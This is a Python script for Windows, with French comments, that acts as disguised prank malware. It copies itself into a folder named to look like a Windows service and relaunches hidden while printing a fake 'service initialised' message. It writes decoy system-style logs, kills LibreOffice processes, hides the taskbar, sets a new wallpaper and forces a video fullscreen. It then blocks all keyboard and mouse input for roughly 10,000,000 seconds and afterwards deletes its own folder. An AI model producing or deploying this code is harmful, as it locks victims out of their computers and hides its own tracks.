import time, subprocess, ctypes, os, shutil, winsound, sys, random, string, datetime

# --- CONFIG ---
NOM_SCRIPT = "service_task.py"
NOM_DIAPO = "tx.odp"
NOM_VIDEO = "videoplayback.mp4"
MON_IMAGE = "trump.jpg"

TEMP_DIR = os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Temp'), 'WindowsServiceData')
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)

SCRIPT_PC = os.path.join(TEMP_DIR, NOM_SCRIPT)
DIAPO_DEST = os.path.join(TEMP_DIR, NOM_DIAPO)
VIDEO_DEST = os.path.join(TEMP_DIR, NOM_VIDEO)
IMAGE_DEST = os.path.join(TEMP_DIR, MON_IMAGE)

def generer_bruit_logs():
    prefixes = ["sys_check", "win_update", "kern_log"]
    for _ in range(20):
        name = random.choice(prefixes) + "_" + "".join(random.choices(string.digits, k=4)) + ".log"
        try:
            with open(os.path.join(TEMP_DIR, name), "w") as f:
                f.write(f"{datetime.datetime.now()} [INFO] System heartbeat OK\n")
        except: pass

def mission():
    # 1. Génération du bruit informatique
    generer_bruit_logs()
    
    # 2. Vérification de sécurité : on attend que la vidéo soit là
    timeout = 10
    while not os.path.exists(VIDEO_DEST) and timeout > 0:
        time.sleep(1)
        timeout -= 1

    # 3. Lancement Diapo
    if os.path.exists(DIAPO_DEST):
        os.startfile(DIAPO_DEST)
    time.sleep(18)

    # 4. Kill processus
    for p in ["soffice.bin", "soffice.exe", "simpress.exe"]:
        os.system(f"taskkill /f /im {p} /t")
    
    # 5. Camouflage et Fond d'écran
    ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, IMAGE_DEST, 3)

    # 6. LANCEMENT VIDÉO (avec précaution)
    if os.path.exists(VIDEO_DEST):
        # On utilise une commande plus robuste pour forcer l'ouverture
        subprocess.Popen(['powershell', '-Command', f'Start-Process "{VIDEO_DEST}"'])
    
    time.sleep(4)
    
    # Plein écran (F11)
    ctypes.windll.user32.SetCursorPos(5000, 5000)
    ctypes.windll.user32.keybd_event(0x7A, 0, 0, 0)
    time.sleep(0.1)
    ctypes.windll.user32.keybd_event(0x7A, 0, 2, 0)

    # 7. BLOCAGE
    ctypes.windll.user32.BlockInput(True)
    time.sleep(10000000) # Durée du blocage
    
    # 8. FIN ET DISPARITION
    ctypes.windll.user32.BlockInput(False)
    ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 5)
    
    # Autodestruction
    subprocess.Popen(f"timeout /t 3 & rd /s /q \"{TEMP_DIR}\"", shell=True, creationflags=0x08000000)
    sys.exit()

if __name__ == "__main__":
    if "WindowsServiceData" not in os.path.abspath(__file__):
        dossier_source = os.path.dirname(os.path.abspath(__file__))
        try:
            # On copie tout méticuleusement
            shutil.copy2(os.path.abspath(__file__), SCRIPT_PC)
            for f in [NOM_DIAPO, NOM_VIDEO, MON_IMAGE]:
                src = os.path.join(dossier_source, f)
                if os.path.exists(src):
                    shutil.copy2(src, os.path.join(TEMP_DIR, f))
        except: pass
        
        # Lancement de la mission en arrière-plan
        subprocess.Popen([sys.executable, SCRIPT_PC], creationflags=0x08000000)
        print("Service système initialisé.")
        sys.exit()
    else:
        mission()